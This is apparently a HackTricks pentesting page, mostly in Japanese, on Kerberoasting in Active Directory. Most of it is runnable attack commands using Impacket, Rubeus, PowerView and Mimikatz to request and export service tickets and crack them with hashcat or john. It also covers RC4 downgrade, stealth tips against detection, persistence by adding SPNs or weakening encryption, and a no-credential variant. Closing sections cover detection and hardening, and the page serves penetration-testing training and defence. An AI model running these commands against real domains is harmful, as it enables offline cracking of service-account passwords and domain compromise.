# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoastingは、Active Directory (AD) のユーザーアカウントに関連するサービスに特に関連するTGSチケットの取得に焦点を当てています。コンピューターアカウントは除外されます。これらのチケットの暗号化は、ユーザーパスワードから派生したキーを使用しており、オフラインでの資格情報クラックが可能です。ユーザーアカウントをサービスとして使用することは、非空のServicePrincipalName (SPN) プロパティによって示されます。

認証されたドメインユーザーは誰でもTGSチケットを要求できるため、特別な権限は必要ありません。

### Key Points

- ユーザーアカウント（すなわち、SPNが設定されたアカウント）で実行されるサービスのTGSチケットをターゲットにします（コンピューターアカウントではありません）。
- チケットはサービスアカウントのパスワードから派生したキーで暗号化されており、オフラインでクラック可能です。
- 権限の昇格は不要で、認証されたアカウントは誰でもTGSチケットを要求できます。

> [!WARNING]
> ほとんどの公開ツールは、AESよりもクラックが速いため、RC4-HMAC（etype 23）サービスチケットの要求を好みます。RC4 TGSハッシュは`$krb5tgs$23$*`で始まり、AES128は`$krb5tgs$17$*`、AES256は`$krb5tgs$18$*`で始まります。しかし、多くの環境はAES専用に移行しています。RC4だけが関連しているとは考えないでください。
> また、「スプレーアンドプレイ」ロースティングは避けてください。Rubeusのデフォルトのkerberoastは、すべてのSPNのチケットを照会および要求でき、ノイズが多いです。まずは興味深いプリンシパルを列挙してターゲットにしてください。

### Attack

#### Linux
```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```
マルチ機能ツールには、kerberoast チェックが含まれています:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```
#### Windows

- Kerberoastable ユーザーを列挙する
```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```
- テクニック 1: TGSを要求し、メモリからダンプする
```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```
- 技術 2: 自動ツール
```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```
> [!WARNING]
> TGSリクエストはWindowsセキュリティイベント4769（Kerberosサービスチケットが要求されました）を生成します。

### OPSECおよびAES専用環境

- AESのないアカウントに対して意図的にRC4を要求します：
- Rubeus: `/rc4opsec`はtgtdelegを使用してAESのないアカウントを列挙し、RC4サービスチケットを要求します。
- Rubeus: `/tgtdeleg`はkerberoastとともに可能な限りRC4リクエストをトリガーします。
- 静かに失敗するのではなく、AES専用アカウントをローストします：
- Rubeus: `/aes`はAESが有効なアカウントを列挙し、AESサービスチケット（etype 17/18）を要求します。
- すでにTGT（PTTまたは.kirbiから）を保持している場合は、`/ticket:<blob|path>`を`/spn:<SPN>`または`/spns:<file>`とともに使用してLDAPをスキップできます。
- ターゲティング、スロットリング、ノイズを減らす：
- `/user:<sam>`、`/spn:<spn>`、`/resultlimit:<N>`、`/delay:<ms>`、および`/jitter:<1-100>`を使用します。
- `/pwdsetbefore:<MM-dd-yyyy>`（古いパスワード）を使用して、可能性のある弱いパスワードをフィルタリングするか、`/ou:<DN>`で特権OUをターゲットにします。

例（Rubeus）：
```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```
### クラッキング
```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```
### Persistence / Abuse

アカウントを制御または変更できる場合、SPNを追加することでそのアカウントをkerberoastableにすることができます:
```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```
アカウントをダウングレードしてRC4を有効にし、クラックを容易にする（ターゲットオブジェクトに対する書き込み権限が必要）：
```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```
ここでkerberoast攻撃に役立つツールを見つけることができます: https://github.com/nidem/kerberoast

Linuxからこのエラーが表示された場合: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)`、これはローカル時間のずれが原因です。DCに同期してください:

- `ntpdate <DC_IP>` (一部のディストリビューションでは非推奨)
- `rdate -n <DC_IP>`

### 検出

Kerberoastingは隠密に行われる可能性があります。DCからのイベントID 4769を探し、フィルターを適用してノイズを減らします:

- サービス名 `krbtgt` と `$` で終わるサービス名（コンピュータアカウント）を除外します。
- マシンアカウントからのリクエスト（`*$$@*`）を除外します。
- 成功したリクエストのみ（失敗コード `0x0`）。
- 暗号化タイプを追跡します: RC4 (`0x17`)、AES128 (`0x11`)、AES256 (`0x12`)。`0x17` のみでアラートを出さないでください。

例のPowerShellトリアージ:
```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
Where-Object {
($_.Message -notmatch 'krbtgt') -and
($_.Message -notmatch '\$$') -and
($_.Message -match 'Failure Code:\s+0x0') -and
($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
($_.Message -notmatch '\$@')
} |
Select-Object -ExpandProperty Message
```
追加のアイデア:

- ホスト/ユーザーごとの正常なSPN使用のベースラインを設定し、単一のプリンシパルからの異なるSPNリクエストの大きなバーストに警告を出す。
- AES強化ドメインでの異常なRC4使用をフラグ付けする。

### 緩和 / ハードニング

- サービス用にgMSA/dMSAまたはマシンアカウントを使用する。管理されたアカウントは120文字以上のランダムなパスワードを持ち、自動的にローテーションされるため、オフラインでのクラッキングは実用的ではない。
- サービスアカウントに対してAESを強制するために、`msDS-SupportedEncryptionTypes`をAES専用（10進数24 / 16進数0x18）に設定し、その後パスワードをローテーションしてAESキーを導出する。
- 可能な限り、環境内でRC4を無効にし、RC4使用の試みを監視する。DCでは、`msDS-SupportedEncryptionTypes`が設定されていないアカウントのデフォルトを制御するために、`DefaultDomainSupportedEncTypes`レジストリ値を使用できる。徹底的にテストする。
- ユーザーアカウントから不要なSPNを削除する。
- 管理されたアカウントが実現不可能な場合は、長くランダムなサービスアカウントのパスワード（25文字以上）を使用し、一般的なパスワードを禁止し、定期的に監査する。

### ドメインアカウントなしのKerberoast（AS要求ST）

2022年9月、チャーリー・クラークは、プリンシパルが事前認証を必要としない場合、リクエストボディ内のsnameを変更することで、KRB_AS_REQを介してサービスチケットを取得できることを示しました。これにより、TGTの代わりにサービスチケットを取得することができます。これはAS-REPロースティングに似ており、有効なドメイン資格情報は必要ありません。

詳細は、Semperisの「新しい攻撃パス: AS要求ST」を参照してください。

> [!WARNING]
> 有効な資格情報がないとLDAPをクエリできないため、ユーザーのリストを提供する必要があります。

Linux

- Impacket (PR #1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```
Windows

- Rubeus (PR #139):
```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```
関連

AS-REP ロースト可能なユーザーをターゲットにしている場合は、以下も参照してください：

{{#ref}}
asreproast.md
{{#endref}}

## 参考文献

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- Microsoft Security Blog (2024-10-11) – MicrosoftのKerberoastingを軽減するためのガイダンス: https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/
- SpecterOps – Rubeus Roasting ドキュメント: https://docs.specterops.io/ghostpack/rubeus/roasting

{{#include ../../banners/hacktricks-training.md}}
